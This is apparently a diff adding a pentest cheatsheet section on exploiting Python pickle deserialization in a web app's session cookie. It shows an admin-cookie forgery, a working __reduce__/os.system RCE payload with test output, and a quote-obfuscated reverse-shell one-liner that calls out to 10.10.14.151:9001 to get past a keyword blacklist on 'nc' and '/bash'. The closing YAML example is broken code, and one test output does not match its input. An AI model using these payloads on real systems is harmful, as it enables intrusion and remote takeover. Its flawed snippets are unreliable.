@@ -1,0 +1,172 @@
+# Python
+When we login to this webapp, we got a cookie like this:
+```http
+HTTP/1.1 302 Found
+Set-Cookie: auth_8bH3mjF6n9=gASVSgAAAAAAAACMCXV0aWwuYXV0aJSMB1Nlc3Npb26Uk5QpgZR9lCiMCHVzZXJuYW1llIwNZnJhbnoubXVlbGxlcpSMBHJvbGWUjAR1c2VylHViLg==
+```
+We try to `base64` decode the cookie and it starts with the bytes `80 04 95` and ends with a `period`.
+Compare it to our cheatsheet at [#Black-Box]({{< relref "#black-box" >}}), this is python `Pickle` version 4 serialized object.
+```sh
+$ echo gASVSgAAAAAAAACMCXV0aWwuYXV0aJSMB1Nlc3Npb26Uk5QpgZR9lCiMCHVzZXJuYW1llIwNZnJhbnoubXVlbGxlcpSMBHJvbGWUjAR1c2VylHViLg== | base64 -d | xxd
+
+00000000: 8004 954a 0000 0000 0000 008c 0975 7469  ...J.........uti
+00000010: 6c2e 6175 7468 948c 0753 6573 7369 6f6e  l.auth...Session
+00000020: 9493 9429 8194 7d94 288c 0875 7365 726e  ...)..}.(..usern
+00000030: 616d 6594 8c0d 6672 616e 7a2e 6d75 656c  ame...franz.muel
+00000040: 6c65 7294 8c04 726f 6c65 948c 0475 7365  ler...role...use
+00000050: 7294 7562 2e                             r.ub.
+```
+## Source Analysis
+This is the `/login` path in `app.py`. After we log in: 
+- It creates our session with our username `sess = util.auth.Session(request.form['username'])`
+- Convert the `sess` object into some string with `auth = util.auth.sessionToCookie(sess).decode()`
+- Set our session cookie to that string with `resp.set_cookie(util.config.AUTH_COOKIE_NAME, auth)`
+```python
+@app.route("/login", methods = ['GET', 'POST'])
+def login():
+    if util.config.AUTH_COOKIE_NAME in request.cookies:
+        return redirect("/")
+
+    if request.method == 'POST':
+        if util.auth.checkLogin(request.form['username'], request.form['password']):
+            resp = make_response(redirect("/"))
+            sess = util.auth.Session(request.form['username'])
+            auth = util.auth.sessionToCookie(sess).decode()
+            resp.set_cookie(util.config.AUTH_COOKIE_NAME, auth)
+            return resp
+    
+    return render_template("login.html")
+```
+A little more digging in `util/auth.py`, and this is the code:
+- `Session` class makes a session object with `username` and `role`
+- `sessionToCookie()` use pickle to serialize the session object, and base64 encode it
+- `cookieToSession()` do the opposite, base64 decode the cookie string and deserialize it
+- Before deserialize cookie, it also filter bad words in the serialized object. If it finds one, it returns nothing
+```python
+class Session:
+    def __init__(self, username):
+        con = sqlite3.connect(config.DB_NAME)
+        cur = con.cursor()
+        res = cur.execute("SELECT username, role FROM users WHERE username = ?", (username,))
+        self.username, self.role = res.fetchone()
+        con.close()
+
+    def getUsername(self):
+        return self.username
+
+    def getRole(self):
+        return self.role
+
+    def isAdmin(self):
+        return self.role == 'admin'
+
+def sessionToCookie(session):
+    p = pickle.dumps(session)
+    b = base64.b64encode(p)
+    return b
+
+def cookieToSession(cookie):
+    b = base64.b64decode(cookie)
+    for badword in [b"nc", b"ncat", b"/bash", b"/sh", b"subprocess", b"Popen"]:
+        if badword in b:
+            return None
+    p = pickle.loads(b)
+    return p
+```
+## Privesc
+We edit the `Session` class in `util/auth.py` a bit, since we don't have the database, and we also want to specify our own role.
+```python
+class Session:
+    def __init__(self, username):
+        #con = sqlite3.connect(config.DB_NAME)
+        #cur = con.cursor()
+        #res = cur.execute("SELECT username, role FROM users WHERE username = ?", (username,))
+        #self.username, self.role = res.fetchone()
+        #con.close()
+        self.username = username
+        self.role = 'admin'
+```
+Then, we can create our `exploit.py` where the `app.py` is with this content
+```python
+import util.auth
+
+s = util.auth.Session("franz.mueller")
+c = util.auth.sessionToCookie(s)
+print(c.decode())
+```
+And we will test if it works locally using python command line
+```sh
+$ python3
+
+Python 3.10.7 (main, Oct  1 2022, 04:31:04) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import util.auth
+>>> s = util.auth.cookieToSession('gASVRgAAAAAAAACMCXV...SNIP...b2xllIwFYWRtaW6UdWIu')
+>>> s.username 
+'attacker'
+>>> s.role
+'admin'
+```
+After we confirmed that it works, just change our cookie value to this base64 string and we should get elevated privilege
+## RCE
+In the [documentation](https://docs.python.org/3/library/pickle.html#object.__reduce__), when unpickling objects, if the pickled object contains a definition for function `object.__reduce__()`, it will run it to restore the original object.
+Reading about `object.__reduce__()`, we see that it returns a tuple that contains:
+- A **callable object** (function, class, etc) that will be called to create the initial version of the object.
+- A **tuple** of arguments for the callable object.
+We can use `os.system()` to execute command and circumvent the word blacklist. Since `__reduce__` must also return a **tuple**, we pass `("ping -c 5 127.0.0.1",)` as argument to `os.system()`
+```python
+import pickle
+import base64
+import os
+
+class RCE:
+    def __reduce__(self):
+        return os.system, ("ping -c 5 127.0.0.1",)
+
+r = RCE()
+p = pickle.dumps(r)
+b = base64.b64encode(p)
+print(b.decode())
+```
+Running the exploit, we got this:
+```sh
+$ python3 ./exploit.py
+gASVLgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBNwaW5nIC1jIDUgMTI3LjAuMC4xlIWUUpQu
+```
+Then we can test the exploit locally like this. Confirmed that it works
+```sh
+$ python3
+Python 3.13.11 (main, Dec  8 2025, 11:43:54) [GCC 15.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+
+>>> import util.auth
+>>> util.auth.cookieToSession('gASVLgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBNwaW5nIC1jIDUgMTI3LjAuMC4xlIWUUpQu')
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.342 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.089 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.068 ms
+64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.084 ms
+64 bytes from 127.0.0.1: icmp_seq=5 ttl=64 time=0.102 ms
+
+--- 127.0.0.1 ping statistics ---
+5 packets transmitted, 5 received, 0% packet loss, time 4086ms
+rtt min/avg/max/mdev = 0.068/0.137/0.342/0.103 ms
+0
+```
+To execute a revshell command, we can execute this `n'c' -nv 10.10.14.151 9001 -e /bin''/bash`. The quote `'` has no effect when executing command
+## YAML
+Same thing if webapp use `yaml` module instead of `pickle`
+```python
+import yaml
+import subprocess
+
+class RCE():
+  def __reduce__(self):
+    return subprocess.Popen(["head", "/etc/passwd"])
+
+# Serialize (Create the payload)
+r = RCE()
+e = yaml.dump(r)
+b = base64.b64encode(e)
+print(b.decode())
+```
